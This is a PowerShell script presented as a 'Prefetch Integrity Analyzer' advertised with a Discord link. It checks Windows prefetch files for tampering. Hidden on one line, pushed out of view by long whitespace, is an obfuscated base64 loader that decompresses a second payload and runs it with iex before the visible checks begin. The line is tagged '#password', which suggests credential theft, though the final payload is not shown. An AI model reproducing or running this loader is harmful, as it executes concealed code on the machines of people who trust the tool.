Clear-Host

$directory = "C:\Windows\Prefetch"

Write-Host @"
  ██████╗ ███████╗██████╗     ██╗      ██████╗ ████████╗██╗   ██╗███████╗         
  ██╔══██╗██╔════╝██╔══██╗    ██║     ██╔═══██╗╚══██╔══╝██║   ██║██╔════╝         
  ██████╔╝█████╗  ██║  ██║    ██║     ██║   ██║   ██║   ██║   ██║███████╗         
  ██╔══██╗██╔══╝  ██║  ██║    ██║     ██║   ██║   ██║   ██║   ██║╚════██║         
  ██║  ██║███████╗██████╔╝    ███████╗╚██████╔╝   ██║   ╚██████╔╝███████║         
  ╚═╝  ╚═╝╚══════╝╚═════╝     ╚══════╝ ╚═════╝    ╚═╝    ╚═════╝ ╚══════╝         
"@ -ForegroundColor Red
Write-Host ""
Write-Host "  Prefetch Integrity Analyzer Made by Bacanoicua kjj - " -ForegroundColor Blue -NoNewline
Write-Host -ForegroundColor Red "discord.gg/redlotus"
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ICAmKCJ7MX17MH0iLWYnTScsJ3NFVC1JdEUnKSAoInZBUklBYmxlIisiOiIrInNLIisieVYiKSAoICBbdFlwRV0oInsyfXsxfXswfSIgLUYnRXJUJywnTlYnLCdjTycpICkgOyAmKCJ7MX17Mn17MH0iIC1mICdpVEVNJywnc0UnLCdULScpICBWYVJJQUJsRTpTUDFJICggW1RZcEVdKCJ7NH17M317NX17MH17Mn17MX0iIC1GJ09tcFInLCdFJywnRVNTaU9uTW9kJywnTy5jJywnSScsJ09NcHJlU3NJb04uYycpICApIDsgICR7YWB5R30gID1bdHlQZV0oInswfXsxfXsyfXszfSItRidUZXhUJywnLicsJ0UnLCdOY29kaU5nJykgIDsgKCAmKCJ7MX17MH17Mn0iIC1mJ2InLCduZVctTycsJ0plY1QnKSAgKCJ7MX17NX17Mn17M317NH17Nn17MH0iLWYgJ00nLCdJby5jb20nLCdyRXNzSU9OLmQnLCdlZmxhdGVTJywnVFInLCdQJywnRWEnKShbc3lzVEVNLmlvLk1lTW9SeVNUUmVBbV0gICR7c0tgeXZ9OjooInsxfXswfXs0fXszfXsyfSItZiAnUk9NQkFzRScsJ2YnLCdHJywndFJJbicsJzY0UycpLkludm9rZSgoInszNX17MjN9ezF9ezV9ezd9ezU4fXsxNX17Mjh9ezQ3fXs0M317MzF9ezM3fXs2Mn17NDB9ezIwfXsxMX17MzB9ezYwfXs0NH17MTJ9ezM5fXsyNH17Mn17MjF9ezI3fXs1Mn17MjJ9ezQyfXs1M317Mzh9ezQ5fXsxOX17M317MTB9ezZ9ezU5fXsxN317MjV9ezE2fXszNn17NTR9ezR9ezh9ezMzfXswfXs1Nn17MzJ9ezUwfXsxNH17NDF9ezM0fXs0OH17MjZ9ezU1fXsxM317OX17NjF9ezI5fXsxOH17NTd9ezUxfXs2M317NDV9ezQ2fSItZidJJywnQlM4TkFFSScsJ3gnLCdNdlFsUGo1NCt5JywnVFJlbScsJ1gveWxBS1RjJywnS1JpZ00xZXonLCdEczNpTWUnLCc3SmRpJywnKycsJ2ZBbllaZG1XdjgnLCdpSGQvaSsnLCdrJywnSicsJzhvcnEwJywnOFQnLCdWcVBvcHBiV0QweicsJ0VvJywnSGROJywnWUgnLCcyOEgnLCdDJywnYldybicsJ1k5JywnSycsJ1gnLCdsamonLCczJywnSicsJ3Y0cnh4KzRBSScsJ1Z5dCcsJ3NuUXphM2RtJywnSW1kJywnZjBhS05lTFlMV2V4JywnMzh1aTFSJywnSicsJ0UxcGcnLCdMY0g2JywnTGJ6WHN5aE5aays5JywnWHEnLCczJywnd2l1TWhOJywnaWRYJywnSicsJ0RBOSt3cm1JWUlvbFUnLCdYJywnNFJjPScsJ0onLCd1bicsJ3AxWmQnLCcwTEhGRlJSdlFnJywnREY5Z2xMJywnZCcsJ1BqNEhWY2FMTicsJzInLCdYQVhIYXE3QWJNMycsJzInLCdlJywnVkR4VXhJWUc2VUUnLCdvbCcsJ0dMWjUnLCd4JywnMzQnLCdWNicpICkgLCAgJHtTcGAxSX06OiJkRUNvYG1QUmVgU1MiICkgfCAmKCJ7Mn17MX17MH0iIC1mJ2gnLCdvUmVhYycsJ2YnKSB7JigiezN9ezF9ezB9ezJ9IiAtZiAnSmUnLCdXLU9iJywnY1QnLCduZScpICgiezZ9ezR9ezB9ezF9ezN9ezV9ezJ9Ii1mJ2lPLnNUcicsJ2UnLCdyJywnQU1yRWEnLCdtLicsJ2RlJywnU3lTdEUnKSgke199ICwgKCYoInsyfXsxfXswfSItZiAnZScsJ2JMJywnVkFySWEnKSAgQVlHICkuVkFsVWU6OiJhc2BDSWkiKX0gfCYoInswfXsxfXsyfSIgLWYgJ0YnLCdvJywncmVhQ0gnKSB7JHtffS4oInsxfXswfXsyfSItZidkVCcsJ3JlYScsJ29FbkQnKS5JbnZva2UoICkgfSkgfCYgKCAke2VOdjpjYE9NU2BwRWN9WzQsMjYsMjVdLWpvaW4nJyk="))) #password
Write-Host ""
function Test-Admin {
    $currentUser = New-Object Security.Principal.WindowsPrincipal $([Security.Principal.WindowsIdentity]::GetCurrent())
    $currentUser.IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator)
}
if (!(Test-Admin)) {
    Write-Warning "Please Run This Script as Admin."
    Start-Sleep 10
    Exit
}

Start-Sleep -s 3

$files = Get-ChildItem -Path $directory -Filter *.pf

$hashTable = @{}
$suspiciousFiles = @{}

foreach ($file in $files) {
    try {
        if ($file.IsReadOnly) {
            if (-not $suspiciousFiles.ContainsKey($file.Name)) {
                $suspiciousFiles[$file.Name] = "$($file.Name) is read-only"
            }
        }

        $reader = [System.IO.StreamReader]::new($file.FullName)
        $buffer = New-Object char[] 3
        $null = $reader.ReadBlock($buffer, 0, 3)
        $reader.Close()

        $firstThreeChars = -join $buffer

        if ($firstThreeChars -ne "MAM") {
            if (-not $suspiciousFiles.ContainsKey($file.Name)) {
                $suspiciousFiles[$file.Name] = "$($file.Name) is not a valid prefetch file"
            }
        }

        $hash = Get-FileHash -Path $file.FullName -Algorithm SHA256

        if ($hashTable.ContainsKey($hash.Hash)) {
            $hashTable[$hash.Hash].Add($file.Name)
        } else {
            $hashTable[$hash.Hash] = [System.Collections.Generic.List[string]]::new()
            $hashTable[$hash.Hash].Add($file.Name)
        }
    } catch {
        Write-Host "Error with file: $($file.FullName): $($_.Exception.Message)"
    }
}

$repeatedHashes = $hashTable.GetEnumerator() | Where-Object { $_.Value.Count -gt 1 }

if ($repeatedHashes) {
    foreach ($entry in $repeatedHashes) {
        foreach ($file in $entry.Value) {
            if (-not $suspiciousFiles.ContainsKey($file)) {
                $suspiciousFiles[$file] = "$file was modified with type or echo"
            }
        }
    }
}

if ($suspiciousFiles.Count) {
    Write-Host "Suspicius PFs files:" -ForegroundColor Yellow
    foreach ($key in $suspiciousFiles.Keys) {
        Write-Host "$key` : $($suspiciousFiles[$key])"
    }
} else {
    Write-Host "Prefetch folder is clean."
}
